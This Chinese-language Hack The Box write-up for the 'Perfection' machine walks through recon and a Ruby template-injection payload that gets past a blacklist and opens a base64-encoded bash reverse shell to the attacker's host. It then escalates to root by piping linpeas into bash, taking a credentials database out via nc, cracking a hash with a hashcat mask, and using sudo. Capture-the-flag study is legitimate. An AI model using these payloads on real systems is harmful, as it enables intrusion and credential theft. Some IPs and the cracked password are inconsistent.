# HTB靶机渗透之perfection（linux-easy）超详细！！！

## 一、基本信息收集

靶机ip地址：10.129.183.94

渗透机地址：10.10.16.13

首先对靶机进行nmap扫描

```
sudo nmap -sC -sT -sV -A -O 10.10.16.13
```

结果如下

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-03 13:30 CST
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 80.78% done; ETC: 13:31 (0:00:11 remaining)
Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 13:32 (0:00:00 remaining)
Nmap scan report for 10.129.88.137
Host is up (0.52s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/3%OT=22%CT=1%CU=38893%PV=Y%DS=2%DC=T%G=Y%TM=65E40B72
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=111%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11N
OS:W7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   568.01 ms 10.10.16.1
2   327.66 ms 10.129.88.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.10 seconds

```

可以看到开放了22,80端口，22端口的渗透优先级肯定要靠后，先看看80端口，用dirsearch来扫描一下网站目录看看能不能爆出有用信息出来

```
dirsearch -u http://10.129.183.94
```

结果如下，也没爆出什么有用信息

```
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/junbujian/.dirsearch/reports/10.129.88.137/-_24-03-03_13-54-46.txt

Error Log: /home/junbujian/.dirsearch/logs/errors-24-03-03_13-54-46.log

Target: http://10.129.88.137/

[13:54:48] Starting: 
[13:55:28] 200 -    4KB - /about

Task Completed

```

只扫出来一个about，此时用紫色小插件收集信息，结果如下

![截图 2024-03-03 13-48-25](https://s2.loli.net/2024/03/05/pYyS1ws3QqzxFOt.png)

可以看到网站的一些基本信息，例如使用了WEBrick1.7.0,以及语言是ruby，这就找到了两个比较有用的信息，WEBrick是ruby 中内嵌的 HTTP 服务器程序库，这更加使我们确定了服务器是利用ruby语言搭建的，那么像ruby、python这样的用高级语言搭建的服务器一般是利用通用模板搭建的，就会有可能存在SSTI（Server Side Tamplate Injection）漏洞，这是一个有可能的突破点

## 二、攻击方向确定

上文提到可能存在SSTI攻击，于是我们就要去测试一下是否存在，SSTI和SQL注入的原理基本类似，都是通过传参来闭合语句，同时在语句外部来执行恶意代码造成RCE（Remote Code Execute）攻击，所以我们要找到一个能传参的地方，而这个网站是一个网页计算器，我们就可以尝试通过往里输入恶意代码来测试是否存在漏洞，于是我们输入以下信息

![截图 2024-03-05 16-29-44](https://s2.loli.net/2024/03/05/s9hYezdLEOmUkMQ.png)

![截图 2024-03-05 16-30-23](https://s2.loli.net/2024/03/05/zwADXPOhqIYu1Vl.png)

报错了，要求百分比加到100,修改修改如下

![截图 2024-03-05 16-31-13](https://s2.loli.net/2024/03/05/GOHQxd8sBf4lgiA.png)

提示malicous input，说明我们有语句触发关键词黑名单了，于是我们使用burp抓包看能不能解决问题

![截图 2024-03-05 16-37-30](https://s2.loli.net/2024/03/05/SYU7oOLb8uPr54v.png)

![](https://s2.loli.net/2024/03/05/SYU7oOLb8uPr54v.png)

发现用burp抓包后修改数据再发送就不会被黑名单了，可能是burp跳过了某些js的限制，让我们直接跳过了malicious的审查，这也说明这个漏洞是存在利用的，确定了攻击方向，于是我们就开开心心编写payload咯

## 三、获得立足点

前面提到，我们发现了SSTI漏洞，于是我们要尝试编写payload来拿到基本用户的shell，由于我们是通过传参的方式来进行RCE，所以在编写payload的时候要复杂一点

首先是确定基本payload语句（记得换成你自己的ip地址和端口），如下：

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.13/8866 0>&1
```

这是基本反弹shell的语句，但是我发现直接执行语句似乎会触发某种错误

![截图 2024-03-05 16-46-10](https://s2.loli.net/2024/03/05/28EiNP4o9lJq1sw.png)

于是为了payload顺利执行，也为了避免后面可能会有一些关键字过滤，我们直接将payload使用base64编码来进行嵌套，这也是我们反弹shell的常用手段

我们在burp中的decoder将payload用base64编码

![截图 2024-03-05 17-04-31](https://s2.loli.net/2024/03/05/wR69o7HMGyV8lCB.png)

![截图 2024-03-05 17-05-40](https://s2.loli.net/2024/03/05/7AQguPzXw2anFo5.png)

这里很奇怪，如果我们直接把payload编码为base64会无法执行，但是如果我们从“-i”这个地方把payload分开来编码再拼在一起就可以，所以我们得到如下payload（base64格式）

```
IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODg2NiAwPiYxIA==
```

接下来就是要闭合ruby的语句来执行我们的payload了，在ruby的网页模板中使用

```
<%[恶意代码]%>;
```

这个格式来执行代码，同时我们使用的%a0是截断符号，它可以使bash在读取代码时读到这个符号时停止读取这一行的后续代码，取而代之的是接着执行后面的代码，所以我们有如下拼接格式

```
aaa%0a<%[恶意代码]%>;
```

但由于这个代码在输入网页后，发送到服务器前会被自动url编码，所以我们要对对应的字符手动进行url编码，防止自动url编码破坏了我们的恶意代码，于是我们修改为如下格式

```
aaa%0a<%25[恶意代码]%25>;
```

接下来就是对恶意代码的编写了，我们的payload已经变成了base64格式的代码，我们需要控制bash来反弹这个payload，于是我们要使用ruby中的system()函数来调用bash执行语句，于是

```
恶意代码=system("其余恶意代码");
```

而其余恶意代码要让base64格式的payload能被正确在bash中读取，在linux系统中，我们可以通过echo来写入文件或是执行命令，然后调用base64 -d来解析payload，最后再用bash执行，“|”符号的作用就是分割语句，于是有

```
其余恶意代码=echo "[payload]" | base64 -d | bash
```

还没结束呢，在传参中url编码会自动忽略空格（该死的url！！），所以我们要用“+”来代替上述语句

就有

```
其余恶意代码=echo+[payload]|+base64+-d+|+bash
```

此时我们再将paylaod带入其中就有

```
其余恶意代码=echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODg2NiAwPiYxIA==|+base64+-d+|+bash
```

再一层层套上去，就有

```
恶意代码=system("echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODg2NiAwPiYxIA==|+base64+-d+|+bash");
```

再往前带入就有

```
aaa%0a<%25=system("echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODg2NiAwPiYxIA==|+base64+-d+|+bash);%25>;
```

这就是最终的payload了，再代入post数据包中

```
category1=aaa%0a<%25=system("echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODg2NiAwPiYxIA==|+base64+-d+|+bash");%25>;&grade1=1&weight1=20&category2=bb&grade2=1&weight2=20&category3=cc&grade3=1&weight3=20&category4=dd&grade4=1&weight4=20&category5=ee&grade5=1&weight5=20
```

然后开启一个终端输入

```
nc -nlvp 8866
```

发送！

![截图 2024-03-05 17-29-43](https://s2.loli.net/2024/03/05/AYOSi5r6HPedhnW.png)

shell成功反弹！！！成功获得立足点！

## 四、提权

这里直接去到/home/susan目录找到user.txt

![截图 2024-03-05 17-32-09](https://s2.loli.net/2024/03/05/QVFhezJxvkiHqAj.png)

此时sudo -l执行不了，需要password，我们用一用万能的find命令看看

```
find / -perm -u=s -type f 2>/dev/null
```

![截图 2024-03-05 17-35-17](https://s2.loli.net/2024/03/05/P68tRlksbCVh3jd.png)

好像也没有什么可以利用的，传入linpeas看看提权吧

在有linpeas.sh的文件夹下用python开启http服务

```
python3 -m http.server 9960 -d ./
```

然后在靶机上访问我们的端口来执行linpeas.sh

```
cd /tmp | curl http://10.10.16.13:9960/linpeas.sh | bash
```

![截图 2024-03-05 17-48-42](https://s2.loli.net/2024/03/05/WZL4mXKB1FAeTlx.png)

这里看到爆出了一个db文件,我们把它下载下来看看,我们利用nc来传输

```
本机:nc -nlvp 6543 > test.db
靶机:nc 10.10.16.13 6543 < pupilpath_credentials.db
```

我们来看看有什么东西

```
sqllite3 ./test.db
```

发现了一堆密码hash但是爆破失败了,最后在[这篇文章](https://blog.csdn.net/m0_52742680/article/details/136472694?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170962270916800184174915%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=170962270916800184174915&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-136472694-null-null.142^v99^pc_search_result_base6&utm_term=hack%20the%20box%20perfection&spm=1018.2226.3001.4187)下得到启发,大概意思就是需要用户自己重置密码，重置的格式为{名字_名字的逆序_在(1,1000000000)之间的一个随机数}，尝试使用hashcat的掩码爆破功能破解

```
hashcat -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d

```

![截图 2024-03-05 18-11-47](https://s2.loli.net/2024/03/05/p1vAyBrJsLq4Geo.png)

得到密码:suan_nasus_413759210

使用ssh登陆到主机

```
ssh susan@10.129.183.94
```



![截图 2024-03-05 18-15-50](https://s2.loli.net/2024/03/05/wkegxzBa4Unp9Lc.png)

然后sudo -i 获取root权限

拿到root

```
cat /root/root.txt
```

6928c1548fe2af3be99fa8ba07a39b98

至此本次渗透测试全部完成!

## 五、总结

这台靶机user.txt中规中矩,但是root.txt有点出人意料,但这也体现了渗透测试过程中信息收集的重要性,以上内容如有侵权请联系我,最后希望各位动动手点点赞和关注一下,毕竟写这么详细的测试过程真的很累(累洗了~)